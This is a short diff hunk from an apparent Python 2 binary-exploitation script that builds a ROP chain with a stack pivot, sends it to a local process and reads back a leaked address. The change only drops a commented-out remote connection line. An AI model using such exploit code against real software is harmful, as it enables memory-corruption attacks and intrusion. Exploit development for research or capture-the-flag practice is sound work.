@@ -12,9 +12,7 @@ buf += rop.call_chain_plt(
     ['read', 0, addr_stage, 400]
 , pivot=addr_stage)
 
-# p = Proc(host='localhost', port=5000)
 p = Proc(rop.fpath)
-
 p.write(p32(len(buf)) + buf)
 print "[+] read: %r" % p.read(len(buf))
 ref_addr = p.read_p64()
